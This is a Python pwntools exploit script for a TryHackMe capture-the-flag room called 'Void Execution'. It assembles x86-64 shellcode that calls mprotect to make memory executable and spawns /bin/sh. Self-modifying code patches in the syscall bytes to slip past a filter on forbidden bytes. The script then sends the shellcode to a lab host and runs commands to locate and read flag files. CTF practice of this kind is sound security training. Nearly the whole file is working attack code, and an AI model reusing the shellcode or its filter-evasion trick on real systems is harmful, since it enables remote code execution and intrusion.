#!/usr/bin/env python3

'''

Room Script: https://tryhackme.com/room/hfb1voidexecution

Medium Article for explanation: https://medium.com/@Sle3pyHead/void-execution-tryhackme-ctf-notes-45c0545b5f10

'''

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'info'

# Target configuration
HOST = "10.201.46.87"
PORT = 9008

# From our Ghidra analysis:
# main function at 0x12eb
# mprotect PLT at 0x1100 
MAIN_OFFSET = 0x12eb
MPROTECT_OFFSET = 0x1100

def create_exploit():
    shellcode = asm(f"""
        /* Assume r13 holds main address at runtime */
        /* Calculate mprotect address: main_base - main_offset + mprotect_plt_offset */
        lea rbx, [r13 - {MAIN_OFFSET} + {MPROTECT_OFFSET}]
        
        /* Call mprotect(0xc0de0000, 100, 7) */
        mov rdi, 0xc0de0000         /* address */
        mov rsi, 0x64               /* length (100 bytes) */
        mov rdx, 0x7                /* PROT_READ|PROT_WRITE|PROT_EXEC */
        call rbx                    /* mprotect() */
        
        /* Setup execve("/bin/sh", NULL, NULL) */
        xor rsi, rsi                /* argv = NULL */
        xor rdx, rdx                /* envp = NULL */
        mov rax, 0x3b               /* sys_execve */
        
        /* Push "/bin/sh" string to stack */
        mov rdi, 0x68732f6e69622f   /* "/bin/sh" */
        push rdi
        mov rdi, rsp                /* rdi points to "/bin/sh" on stack */
        
        /* Self-modifying syscall patch - GENIUS TECHNIQUE! */
        /* Start with safe bytes 0x0e04, increment to get 0x0f05 */
        inc byte ptr [rip + syscall_patch]      /* 0x0e -> 0x0f */
        inc byte ptr [rip + syscall_patch + 1]  /* 0x04 -> 0x05 */
        
        syscall_patch:
        .byte 0x0e, 0x04            /* Will become 0x0f, 0x05 (syscall) */
    """)
    
    return shellcode

def exploit():
    try:
        # Connect to target
        target = remote(HOST, PORT, timeout=15)
        log.info(f"Connected to {HOST}:{PORT}")
        
        # Generate shellcode
        shellcode = create_exploit()
        log.info(f"Shellcode size: {len(shellcode)} bytes")
        
        # Check for obvious forbidden bytes (should be clean)
        forbidden = [0x0f, 0xcd]
        for i, byte in enumerate(shellcode):
            if byte in forbidden:
                log.warning(f"Forbidden byte 0x{byte:02x} at offset {i}")
        
        # Wait for prompt and send exploit
        target.recvuntil(b"Send to void execution:")
        target.sendline(shellcode)
        
        log.success("Exploit sent! Attempting to interact...")
        
        # Test shell
        target.sendline(b"id")
        target.sendline(b"whoami")
        target.sendline(b"ls -la")
        
        # Look for flag  
        target.sendline(b"find / -name '*flag*' -type f 2>/dev/null")
        target.sendline(b"cat flag.txt")
        target.sendline(b"cat /flag.txt")
        target.sendline(b"cat /root/flag.txt")
        target.sendline(b"cat /home/*/flag.txt")
        
        target.interactive()
        
    except Exception as e:
        log.error(f"Exploit failed: {e}")

if __name__ == "__main__":
    exploit()

